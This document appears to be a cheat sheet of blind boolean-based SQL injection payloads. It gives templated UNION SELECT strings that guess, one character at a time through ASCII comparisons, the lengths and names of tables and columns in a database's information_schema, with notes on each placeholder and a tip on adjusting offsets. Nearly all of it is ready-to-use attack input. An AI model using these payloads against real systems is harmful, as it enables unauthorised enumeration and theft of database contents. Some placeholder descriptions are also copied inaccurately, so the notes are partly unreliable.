  ' UNION SELECT 1, #, #... WHERE ascii(SUBSTRING('A', 1, 1)) = 65-- -


- Dumping the LENGHT of a table name:
' UNION SELECT 1 WHERE (SELECT LENGTH(table_name) FROM information_schema.tables WHERE table_schema=DATABASE() LIMIT {index},1) = {LENGHT}-- -


- Dumping the TABLE NAME character by character:
' UNION SELECT 1 WHERE ascii(SUBSTRING((SELECT table_name FROM information_schema.tables WHERE table_schema=DATABASE() LIMIT {index},1), {position}, 1)) = {ascii_value}-- -

{index} — Refers to the index of the table (0 = first, 1 = second, etc.).
{position} — Extracts a specific character of the table name.
{ascii_value} — The ASCII value of the target character.


- Dumping COLUMN LENGHTS:
' UNION SELECT 1 WHERE (SELECT LENGTH(column_name) FROM information_schema.columns WHERE table_schema=DATABASE() AND table_name='{table_name}' LIMIT {position},1) = {NUMBER}-- -
{table_name}: The table name you are targeting.
{position} — Extracts a specific character of the table name.
{number} - lenght of the column name, just keep iterating until the statement is True.

- Dumping COLUMN NAMES character by character:
** If you keep getting 0 as the first valid ASCII value everytime, keep increasing your index position, it's weird, but you need to increase it until you reach the right offset.
' UNION SELECT 1 WHERE ascii(SUBSTRING((SELECT column_name FROM information_schema.columns WHERE table_schema=DATABASE() AND table_name='{table_name}' LIMIT {index},1), {position}, 1)) = {ascii_value}-- -
{table_name}: The table name you are targeting.
{index}: The index of the column (0 = first column, 1 = second column, etc.).
{position}: The position of the character in the column name (1 = first character, 2 = second character, etc.).
{ascii_value}: The ASCII value of the character you are trying to guess.
